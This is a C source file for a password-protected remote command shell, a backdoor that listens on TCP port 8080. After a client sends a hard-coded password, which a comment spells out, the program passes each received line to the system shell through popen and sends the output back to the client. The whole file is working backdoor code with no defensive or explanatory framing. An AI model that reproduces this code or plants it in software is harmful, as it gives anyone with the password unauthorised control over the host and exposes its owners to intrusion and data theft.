//for main()
#include <pthread.h>
//for session()
#include <unistd.h>
#include <stdio.h>
#include <sys/socket.h>
#include <stdlib.h>
#include <netinet/in.h>
#include <string.h>
#define PORT 8080

unsigned long long hash(unsigned char* str){
        unsigned long long hash = 5381045;
        int c;
        while (c = *str++)
            hash = ((hash << 5) + hash) + c; /* hash * 33 + c */
        return hash;
}

void* handler(void* new_socket){

    FILE *fp;
    int valread;
    char net_buffer[1024] = {0};
    char format_buffer[1024] = {0};
    char output_buffer[1024] = {0};
    int conn_check;

    send(*(int*) new_socket, "[*] AUTHENTICATE\n", strlen("[*] AUTHENTICATE\n"), 0 );
    send(*(int*) new_socket, "> ", strlen("> "), 0 );

    // PASSWORD: 4796580010813472948 == "yvnS65uxnW9pQJJZ"
    valread = read(*(int*) new_socket, net_buffer, 1024);
    while(hash(net_buffer) != 4796580010813472948){
        memset(net_buffer, 0, sizeof(net_buffer));
        send(*(int*) new_socket, "[-] AUTH_ERR\n> ", strlen("[-] AUTH_ERR\n> "), 0 );
        valread = read(*(int*) new_socket, net_buffer, 1024);
    }

    memset(net_buffer, 0, sizeof(net_buffer));
    send(*(int*) new_socket, "[+] AUTHENTICATED\n", strlen("[+] AUTHENTICATED\n"), 0 );

    while(strcmp(net_buffer, "exit\n")){

        memset(net_buffer, 0, sizeof(net_buffer));
        send(*(int*) new_socket, "\n", strlen("\n"), 0 );
        send(*(int*) new_socket, "> ", strlen("> "), 0 );
        valread = read(*(int*) new_socket, net_buffer, 1024);
        sprintf(format_buffer, "%s", net_buffer);

        fp = popen(format_buffer, "r");

        while(!feof(fp)){
            if(fgets(output_buffer, sizeof(output_buffer), fp) != NULL){
                send(*(int*) new_socket, "< ", strlen("< "), 0);
                 send(*(int*) new_socket, output_buffer, strlen(output_buffer), 0 );
            }
        }
        pclose(fp);
    }

}

void start(){
    int server_fd, new_socket;
    struct sockaddr_in address;
    int opt = 1;
    int addrlen = sizeof(address);
    pthread_t threadId;

    // Creating socket file descriptor
    if ((server_fd = socket(AF_INET, SOCK_STREAM, 0)) == 0){
        perror("socket failed");
        exit(EXIT_FAILURE);
    }

    // Forcefully attaching socket to the port 8080
    if (setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt))){
        perror("setsockopt");
        exit(EXIT_FAILURE);
    }
    address.sin_family = AF_INET;
    address.sin_addr.s_addr = INADDR_ANY;
    address.sin_port = htons( PORT );

    // Forcefully attaching socket to the port 8080
    if (bind(server_fd, (struct sockaddr *)&address, sizeof(address))<0){
        perror("bind failed");
        exit(EXIT_FAILURE);
    }

    if (listen(server_fd, 3) < 0){
        perror("listen");
        exit(EXIT_FAILURE);
    }

    while(1){
        if ((new_socket = accept(server_fd, (struct sockaddr *)&address, (socklen_t*)&addrlen))<0){
            perror("accept");
            //exit(EXIT_FAILURE);
        }

        pthread_create(&threadId, NULL, handler, &new_socket);
        //handler(new_socket);
    }
}

int main(int argc, char const *argv[]){

    start();
    return 0;
}
